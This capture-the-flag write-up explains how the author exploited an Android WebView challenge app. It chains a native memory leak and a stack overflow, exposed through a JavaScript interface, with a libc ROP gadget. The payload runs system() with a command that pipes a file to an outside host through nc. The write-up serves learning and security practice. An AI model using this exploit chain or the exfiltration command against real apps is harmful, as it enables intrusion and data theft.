

# A tales of cookies and overflowing

No, I'm not talking about my mug and breakfast. It's all related to challenge #5. This one took me some days to be solved but let's start from the beginning.

## Challenge #5 what a mess

After few days it turns out that the first release was unsolvable so I'm going to skip every attempt I made trying to get it done (and believe me, I slept 3/4 hours a day :sleeping:).

## Friends come up

As always, **IDA** & **jadx** will give us some useful info about our target. The **MainActivity** class contains the following code:

```java

    private WebView mWebView;

    static {
        System.loadLibrary("native-lib");
    }

    public String generateString(char c, int i) {
        String str = "";
        for (int i2 = 0; i2 < i; i2++) {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(str);
            stringBuilder.append(c);
            str = stringBuilder.toString();
        }
        return str;
    }

    public String generateString(String str, int i) {
        String str2 = "";
        for (int i2 = 0; i2 < i; i2++) {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(str2);
            stringBuilder.append(str);
            str2 = stringBuilder.toString();
        }
        return str2;
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView((int) R.layout.activity_main);
        bundle = getIntent().getExtras();
        bundle = bundle != null ? bundle.getString("url") : null;
        this.mWebView = (WebView) findViewById(R.id.activity_main_webview);
        this.mWebView.setWebViewClient(new WebViewClient());
        this.mWebView.clearCache(true);
        this.mWebView.getSettings().setJavaScriptEnabled(true);
        if (bundle == null) {
            this.mWebView.loadUrl("https://google.com");
        } else {
            this.mWebView.loadUrl(bundle);
        }
        this.mWebView.setWebViewClient(new CoolWebViewClient());
        this.mWebView.addJavascriptInterface(new PetHandler(), "PetHandler");
    }

    public void onBackPressed() {
        ...
    }
```

Java basically has a binding for everything. It's possible to run Java methods from javascript code in a web page by exposing these methods through an interface keyword (**PetHandler** one) when @JavascriptInterface annotation is present above the method itself.
We can even control the web page location by starting the app with an intent containing an **url** extra.
Last consideration about this class: there're two methods (one method with arguments overload to be more precise) never used nor accessed :confused:. While coding the exploit I realized they were hints :bulb:.

Now we can switch to **PetHandler** class:

```js

    public native byte[] censorCats(byte[] bArr);

    public native byte[] censorDogs(int i, String str);

    public native long getSomething();

    @JavascriptInterface
    public String toString() {
        return "Pets :)";
    }

    @android.webkit.JavascriptInterface
    public java.lang.String censorMyCats(java.lang.String r7) {
        /* JADX: method processing error */
        ...
        /*
        r6 = this;
        r0 = 0;
        r1 = new org.json.JSONArray;     Catch:{ JSONException -> 0x003d }
        r1.<init>(r7);     Catch:{ JSONException -> 0x003d }
        r7 = r1.length();     Catch:{ JSONException -> 0x003d }
        r7 = new byte[r7];     Catch:{ JSONException -> 0x003d }
        r2 = 0;     Catch:{ JSONException -> 0x003d }
    L_0x000d:
        r3 = r1.length();     Catch:{ JSONException -> 0x003d }
        if (r2 >= r3) goto L_0x002e;     Catch:{ JSONException -> 0x003d }
    L_0x0013:
        r3 = r1.getInt(r2);     Catch:{ JSONException -> 0x003d }
        r3 = java.lang.Integer.valueOf(r3);     Catch:{ JSONException -> 0x003d }
        r4 = r3.intValue();     Catch:{ JSONException -> 0x003d }
        r5 = 255; // 0xff float:3.57E-43 double:1.26E-321;     Catch:{ JSONException -> 0x003d }
        if (r4 <= r5) goto L_0x0024;     Catch:{ JSONException -> 0x003d }
    L_0x0023:
        return r0;     Catch:{ JSONException -> 0x003d }
    L_0x0024:
        r3 = r3.intValue();     Catch:{ JSONException -> 0x003d }
        r3 = (byte) r3;     Catch:{ JSONException -> 0x003d }
        r7[r2] = r3;     Catch:{ JSONException -> 0x003d }
        r2 = r2 + 1;
        goto L_0x000d;
    L_0x002e:
        r1 = new org.json.JSONArray;     Catch:{ JSONException -> 0x003c }
        r6 = r6.censorCats(r7);     Catch:{ JSONException -> 0x003c }
        r1.<init>(r6);     Catch:{ JSONException -> 0x003c }
        r6 = r1.toString();     Catch:{ JSONException -> 0x003d }
        return r6;
    L_0x003c:
        return r0;
    L_0x003d:
        r6 = move-exception;
        r6.printStackTrace();
        return r0;
        */
    }

    @android.webkit.JavascriptInterface
    public java.lang.String censorMyDogs(int r1, java.lang.String r2) {
        /* JADX: method processing error */
        ...
        /*
        r0 = this;
        r0 = r0.censorDogs(r1, r2);
        r1 = new org.json.JSONArray;     Catch:{ JSONException -> 0x000e }
        r1.<init>(r0);     Catch:{ JSONException -> 0x000e }
        r0 = r1.toString();
        return r0;
    L_0x000e:
        r0 = 0;
        return r0;
        */
    }

    @JavascriptInterface
    public String getMySomething() {
        return String.valueOf(getSomething());
    }
```

So we've:

- 3 methods imported from **libnative-lib**:
        -  *censorCats*;
        - *censorDogs*;
        - *getSomething*.
- 4 methods binded to **javascript interface**:
        - *toString*;
        - *censorMyCats*;
        - *censorMyDogs*;
        - *getMySomething*.

The file has been "corrupted" but it's not a big deal to understand what the code does in each function.

### :cat::cat::cat: censorMyCats :cat::cat::cat:

**censorMyCats** accepts only one argument which is a **String** one. As you probably noticed, the code contains a lot of `Catch:{ JSONException -> 0x003d }`. This means that there's a big `try/catch` statement:

```java
    try {
        ...
    } catch (JSONException je) {
        je.printStackTrace();
    }
```

Then few more `Catch:{ JSONException -> 0x003c }` which means that there's another nested `try/catch` statement:

```java
    try {
        ...
        try {
        } catch (JSONException sje) {
            ...
        }
    } catch (JSONException fje) {
        je.printStackTrace();
    }
```

Time to fill the holes! Since `r0` is returned and the function returns a **String** we can assume that `r0` is an empty (null) **String** object while `r7` points to the argument (**String** object too).

```java
    r1 = new org.json.JSONArray;
    r1.<init>(r7);
    r7 = r1.length();
    r7 = new byte[r7];
    r2 = 0;

    JSONArray jsonArray = new JSONArray(arg);
    byte[] buffer = new byte[jsonArray.length()];
```

The second block is a bit tricky due to a loop and a nested if:

```java
L_0x000d:
    r3 = r1.length();
    if (r2 >= r3) goto L_0x002e;0x003d }
L_0x0013:
    r3 = r1.getInt(r2);
    r3 = java.lang.Integer.valueOf(r3);
    r4 = r3.intValue();
    r5 = 255;
    if (r4 <= r5) goto L_0x0024;
L_0x0023:
    return r0;
L_0x0024:
    r3 = r3.intValue();
    r3 = (byte) r3;
    r7[r2] = r3;
    r2 = r2 + 1;
    goto L_0x000d;

    for (int x = 0; x < jsonArray.length(); x++) {
        Integer b = Integer.valueOf(jsonArray.getInt(x));
        if (b.valueOf() > 255) { break; }
        buffer[x] = (byte)b.valueOf();
    }
```

Inside the second `try/catch` statement goes the following piece instead:

```java
    r1 = new org.json.JSONArray;
    r6 = r6.censorCats(r7);
    r1.<init>(r6);
    r6 = r1.toString();
    return r6;

    JSONArray cats = new JSONArray(this.censorCats(buffer));
    return cats.toString();
```

Joining pieces together we obtain:

```java
public String censorMyCats(String str) {
    try {
        JSONArray jsonArray = new JSONArray(arg);
        byte[] buffer = new byte[jsonArray.length()];

        for (int x = 0; x < jsonArray.length(); x++) {
            Integer b = Integer.valueOf(jsonArray.getInt(x));
            if (b.valueOf() > 255) { break; }
            buffer[x] = (byte)b.valueOf();
        }

        try {
            JSONArray cats = new JSONArray(this.censorCats(buffer));
            return cats.toString();
        } catch (JSONException sje) {}
    } catch (JSONException fje) {
        je.printStackTrace();
    }

    return null;
}
```

### :dog::dog::dog: censorMyDogs :dog::dog::dog:

This one was simpler. A single `try/catch` statement and two arguments: `r1` and `r2`.

```java
    r0 = this;
    r0 = r0.censorDogs(r1, r2);
    r1 = new org.json.JSONArray;
    r1.<init>(r0);
    r0 = r1.toString();
    return r0;
L_0x000e:
    r0 = 0;
    return r0;

    try {
        dogs = new JSONArray(this.censorDogs(r1, r2));
        return dogs.toString();
    } catch (JSONException je) {
        return null;
    }
```

## Let's get down to biz

Having finished with Java code we can go further and give a look to **libnative-lib** assembly code. I'm going to inspect the **x86_64** library.

### :cat::cat::cat: censorCat :cat::cat::cat:

Everybody knows that cats are pure evil. They break things all day long. Here you're a [poc](https://www.youtube.com/watch?v=R4anpxoHkPI) video (my dog's typing atm). With **IDA** we'll notice that my dog was right!

![](https://i.imgur.com/8ZgUyaq.png)

The stack size is `0x210` bytes but `memcpy` performs a  copy bigger than the stack. Code speaking:

```c
    unsigned char buffer[0x200];
    memcpy(&buffer, input, 0x230);
```

Where **input** is a pointer to an attacker-controlled byte array: the only argument which **censorMyCats** accepts.

We're facing with a [stack canaries](https://ctf101.org/binary-exploitation/stack-canaries/) protection and a [buffer overflow](https://ctf101.org/binary-exploitation/buffer-overflow/) which we'll exploit to grab the flag.

### :dog::dog::dog: censorDogs :dog::dog::dog:

My dog asked me to prove that all dogs are good boys/girls. **IDA** shows us this:

![](https://i.imgur.com/zuA7mOC.png)

Again she was right and again we'll try to understand the code by converting to its "original" c source:

```c
unsigned char *
Java_com_hackerone_mobilechallenge5_PetHandler_censorDogs(JNIEnv *env, jobject obj, int f_arg, jstring s_arg) {
    int l;
    unsigned char *in_b64_string;
    unsigned char buffer[0x200];

    in_b64_string = env->GetStringUTFChars(s_arg, 0);
    l = strlen(b64_string);

    b64_decoded_string = _b64_decode_ex(b64_string, l, 0);
    if (strlen(b64_decoded_string) < 0x201) {
        ...
```

We know now that the first part decodes the string (which is an attacker-controlled param) and checks that its decoded length is `< 0x201` (less than 513 bytes) or, to keep it in a $2^n$ format, `<= 0x200` (less or equals to 512 bytes).
The second part contains juicy code:

![](https://i.imgur.com/sfkR0Dc.png)

```c
    ...
    if (strlen(b64_decoded_string) < 0x201) {
       strcpy(&buffer, b64_decoded_string);

       // -- Here we're again --
       strcpy(&dest, b64_decoded_string);
       str_replace(&dest, "dog", "xxx");
    } else {
       free(b64_decoded_string);
    }
```

Probably you're asking yourself "what's **dest** buffer?"
I'll tell you: **dest** buffer is a static buffer (512 bytes) declared inside/outside the function body and shared across other functions.

Every time this function is called it copies the passed data into **dest** buffer and, most important thing, **the function returns some data from memory** - we can call it a **leak** -.

```c
    ...
    // The code init a new array and gets a sub range
    // but this is another way to achieve the same result
    env->GetByteArrayRegion(env, 0, f_arg, &leaked_memory_buffer);
    return leaked_memory_buffer;
}
```

### getMySomething

No, I don't want anything from you, it's just the name of the last method we're going to analyze:

![](https://i.imgur.com/uUu6q3u.png)

Which seems to return the pointer to **dest** buffer where data is copied from **censorDogs** function.

## Summing up

Before I come to phase II (the real exploitation) I'd like to make a recap of what we've to do to achieve our goal:

 1. Start the app with an **Intent** having an **url** extra set to a controlled domain;
 2. Leak the stack cookie by calling **censorDogs** JNI method through javascript interface;
 3. Leak the base address of **libc** which contains the function we'll use to grab the flag (**system** one);
 4. Inject the data that will be passed as the argument to the above function;
 5. Find a [ROP gadget](https://ctf101.org/binary-exploitation/return-oriented-programming/);
 6. Send the right amount of data to **censorCats** with the **stack cookie** value at the right offset to pass the stack canaries protection and force the code to jump to ROP Gadget address found in step 5.

## Phase II - Exploitation

Point **1** is pretty simple. All we need to know is the package name (*com.hackerone.mobile.challenge5*) of the app we're going to launch.

```java
    private void runChallengeApp() {   
        startActivity(
            getPackageManager()  
                .getLaunchIntentForPackage("com.hackerone.mobile.challenge5")
                .putExtra("url", "https://mydomain.tld/");
        );  
    }
```

Since I'm a CE (Computer Engineer) student and this year I attended an OS course I know a bit more about Linux. Probably the way we should follow to get the **libc** base address involves digging into leaked data but I know a better method (as we'll install the app and not trig the exploit remotely). Every info you need about loaded libraries can be found inside **/proc/self/maps**.

We can join points **1** and **3**. The result is a more controllable exploit and a higher percentage of success.

```java
  private long getLibraryBaseAddress(String lib){  
      Scanner scanner = null;

      try {  
          scanner = new Scanner(  
              new File("/proc/self/maps")  
          );  

          while (scanner.hasNextLine()) {  
              String line = scanner.nextLine()  
                      .trim();  

              // Look for library and 'x'ecution flag  
              if (line.contains(lib) && line.contains("xp")) {  
                  String[] components = line.split("-");  
                  return Long.parseLong(components[0], 16);  
              }  
          }  
      } catch (FileNotFoundException e) {  
          e.printStackTrace();  
      } finally {  
          if (scanner != null) {  
              scanner.close();  
          }  
      }  

      return 0;
  }

  private void runChallengeApp() {   
      startActivity(
          getPackageManager()  
              .getLaunchIntentForPackage("com.hackerone.mobile.challenge5")
              .putExtra("url", String.format(
                "https://mydomain.tld/?%d",
                getLibraryBaseAddress("/system/lib64/libc.so")
              );
      );  
  }
```

Enough with Java. Time for javascript! As said, this part must be coded in javascript as we'll invoke Java functions through javascript interface (**PetHandler**).

### Long life to GDB

Until now I've mainly used two tools: **IDA** and **jadx**. We need to add another one to our toolkit: [GDB](https://www.gnu.org/software/gdb/). It'll help us to step into code while executing it. Basically, we're switching from static to dynamic analysis but don't be afraid nor scared, you've just to follow (the white rabbit :pill:) me. The emulator comes with **gdbserver64** and the **NDK** toolkit contains the **gdb** we need under **NDKPATH/ndk-bundle/prebuilt/darwin-x86_64/bin**.

You can download the right version for your OS [here](https://developer.android.com/ndk/downloads/).

We even need a running local web server. In its root, we'll put the page with our javascript code used to invoke the function/s.

```html
<html>
    <head>
        <script>
            window.addEvenListener('load', () => {
                cmd.addEventListener('click', () => {
                    var leak = PetHandler.censorMyDogs(
                      1024, // Max size of returned leak data
                      btoa('dummy data')
                    )
               })
           })
       </script>
    </head>
    <body>
        <button id="cmd">Censor my dogs</button>
    </body>
</html>
```

If you don't know how to start a web server you can try the [Jobert Abma](https://twitter.com/jobertabma/status/1009460168067723265)'s way :stuck_out_tongue_winking_eye::

```php
$ cd /root/path/of/http/server
$ php -S 0.0.0.0:port
```

Assuming the emulator is running and we've built and installed a custom app (I suggest you to grab [Android Studio](https://developer.android.com/studio/) for this task) with the above Java chunk pointing to the local web server we can launch the following commands:

```bash
$ adb forward tcp:23946 tcp:23946
$ adb shell
$ su
$ gdbserver64 localhost:23946 --attach $(ps -ef | awk '/[c]om.hackerone.mobile.challenge5/{print $2}')
```

And from the host:

```bash
$ gdb /path/of/challenge5/libs/x86_64/libnative-lib.so
GNU gdb (GDB) 7.11
...
Reading symbols from libnative-lib.so...(no debugging symbols found)...done.
```

Once done we can attach to our remote gdb listener and collect some info:

```bash
(gdb) target remote :23946
...
(gdb) layout asm
(gdb) layout regs
(gdb) info functions censorDogs
0x0000000000001270  Java_com_hackerone_mobile_challenge5_PetHandler_censorDogs
0x00007c1e2e78d160  com.hackerone.mobile.challenge5.PetHandler.censorDogs
0x00007c1e2e661270  Java_com_hackerone_mobile_challenge5_PetHandler_censorDogs
```

We now have a wonderful view of asm and registers and we even know the address of **Java_com_hackerone_mobile_challenge5_PetHandler_censorDogs**.

We've just to set a breakpoint on it and resume the execution:

```bash
(gdb) break *0x00007c1e2e661270
(gdb) continue
```

Our web page will be shown into hackerone's mobile app and it's time to push the button! gdb will hang when the address is reached letting us step line by line using `si` or `ni` commands.

```bash
0x7c1e2e661270 <Java_com_~>     push   %rbp
0x7c1e2e661271 <Java_com_~+1>   push   %r15    
0x7c1e2e661273 <Java_com_~+3>   push   %r14  
0x7c1e2e661275 <Java_com_~+5>   push   %rbx  
0x7c1e2e661276 <Java_com_~+6>   sub    $0x408,%rsp  
0x7c1e2e66127d <Java_com_~+13>  mov    %edx,%r14d  
0x7c1e2e661280 <Java_com_~+16>  mov    %rdi,%rbx           
0x7c1e2e661283 <Java_com_~+19>  mov    %fs:0x28,%rax    <--- rax contains our stack cookie
0x7c1e2e66128c <Java_com_~+28>  mov    %rax,0x400(%rsp)

-----

rax            0xa1d20cf7896c32ce
rcx            0x7c1e2affdd88
rsi            0x7c1e2affdd84
rbp            0x7c1e2affde18
r8             0x7c1e2affe178
r10            0x7c1e2e8cc049
```

You've to reach the marked line. In my case the stack cookie is `0xa1d20cf7896c32ce`. Why do we need to know its value? 'Cause we must locate it in returned leaked data!

The first argument of `PetHandler.censorMyDogs` function is `1024` meaning that we want 1024 bytes back. Let's use math:

`1024 (size of leaked data in bytes) / 8 (size of a DWORD in bytes) = 128 total DWORDs`

Don't forget the [endianness](https://en.wikipedia.org/wiki/Endianness) . We're dealing with Little-Endian so our entries "must be reversed" (please, don't kill me). The following example will clarify:

```javascript
    leak = [
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ...
        0xce, 0x32, 0x6c, 0x89, 0xf7, 0x0c, 0xd2, 0xa1
        ...
    ]
```

The cookie is here, indeed. If you try to run the code again, again and again, you'll notice that the :cookie: starts alway at offset `0x400` in **leak** array.

### Approaching cats in a different way

Instead of dynamic analysis, I'd like to approach the exploitation of **censorCats** with pure math.

![](https://i.imgur.com/8ZgUyaq.png)

From the code above we know that the reserved stack size for this function is `0x210` (bytes), `rcx` contains the :cookie: which is saved at `rsp+0x228-0x20` and the **memcpy** copies `0x230` bytes.

`0x228 - 0x20 = 0x208`: where our :cookie: should reside in passed data;
`0x230 - 0x208 = 0x28`: 4 more dwords we've control of (40 bytes total).

If you think my math is wrong try by yourself using gdb :grimacing:.

As said, we can control 4 dwords at the end of the stack which will be respectively popped in `rbx`, `r14`, `r15` and used for `retn` address.

Our temporary payload will look like:

```javascript
    payload = [
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ...
        cookie,                                            // @ offset 0x208
        systemFunctionAddress,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,    // don't care about rsi
        getMySomethingValue,                               // rdi
        ???
    ]
```

### ROP Gadged - :musical_note: Its the g-a-d to the g-e-t :musical_note:

The **5th** point or our checklist requires to locate a ROP Gadged. There're a lot of tools out there but I suggest you use [ropper](https://scoding.de/ropper/). Since last three instructions of **censorCats** are:

```asm
   pop rbx,
   pop r14,
   pop r15,
   retn
```

I need to locate somewhere a `mov rdi, r[bx|14|15]` followed by a `jmp r[bx|14|15]`.

This part took me some hour until I realized I was searching in the wrong library :see_no_evil:.

```bash
$ adb pull /system/lib64/libc.so /tmp/libc.so
$ ropper2 --file /tmp/libc.so --search "mov rdi, r1?"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO]  Searching for gadgets: mov rdi, r1?

[INFO]  File: /tmp/libc.so
0x0000000000028bea: mov  rdi, r12; mov  rdx, r15; call  qword ptr [rax + 0x20];
0x00000000000a2daf: mov  rdi, r12; mov  rsi, r15; mov  rdx, r14; mov  rcx, r13; call  qword ptr [rbx + 0x20];
0x00000000000a2c09: mov  rdi, r13; mov  rsi, r14; call  rax;
0x0000000000027bee: mov  rdi, r14; call  qword ptr [rax + 0x38];
0x000000000002af19: mov  rdi, r14; call  rbx;
0x00000000000c2273: mov  rdi, r14; mov  rdx, r10; call  0xc0820; xor  edi, edi; mov  rsi, r14; call  rbx;
0x00000000000c217e: mov  rdi, r14; mov  rsi, r15; call  rbx;
0x00000000000c2176: mov  rdi, r15; call  0xc0820; mov  rdi, r14; mov  rsi, r15; call  rbx;
0x0000000000027ff8: mov  rdi, r15; call  qword ptr [rax + 0x38];
0x00000000000a2644: mov  rdi, r15; mov  rdx, r14; call  rax;
0x00000000000a2a42: mov  rdi, r15; mov  rsi, qword ptr [rsp + 0x128]; mov  rcx, rsi; call  qword ptr [rbp + 0x20];
0x00000000000a353b: mov  rdi, r15; mov  rsi, r13; mov  rdx, rbx; call  qword ptr [rbp + 8];
0x000000000007cd40: mov  rdi, r15; mov  rsi, rbp; call  rbx;
```

Can you spot it?

```bash
0x00000000000c217e: mov rdi, r14; mov rsi, r15; call rbx;
```

This means that the final payload will be:

```javascript
    payload = [
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ...
        cookie,                                            // @ offset 0x208
        systemFunctionAddress,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,    // don't care about rsi
        getMySomethingValue,                               // rdi
        ropGadgetAddress
    ]
```

Where finally:

- cookie holds our stack cookie value;
- systemFunctionAddress is the pointer to **libc system** function (libc base address + 0x7d360);
- getMySomethingValue is the pointer to the first argument passed to **system** function (in our case *cat /data/local/tmp/challenge5 | nc ip port*);
- ropGadgetAddress is the pointer to our rop gadged (base libc address + 0xc217e).

## When language does not assist you

We're almost done. Every **libc** function address (in-memory address, not the relative one) can be obtained by adding the relative function address to the value passed as search component from our Java app to our webpage.

In case you forgot it:

```java
    ...
    .putExtra("url", String.format(
        "https://mydomain.tld/?%d", // <---- %d
         getLibraryBaseAddress("/system/lib64/libc.so"
       )
     );
     ...
```

Probably the big issue for this challenge was the lack of 64bit integer support in javascript. I had to type more code to handle them than the code to exploit the bug.

[Here](https://github.com/luc10/h1-702-2018-ctf-wu/challenge-5/) you can find the whole source of the exploit.

## Summing up

There’s a lot to say but I bet everyone who played the Android challenge had so much fun. I must thank Christopher Thompson and the whole H1 team for giving me an opportunity to take a break from university and exams with this awesome CTF challenge. No matter what, I hope to jump into another one soon. Time to rest (study) now! :zzz:

Uh, I almost forgot... The last flag is:

`flag{in_uR_w33b_view_4nd_ur_mem}`
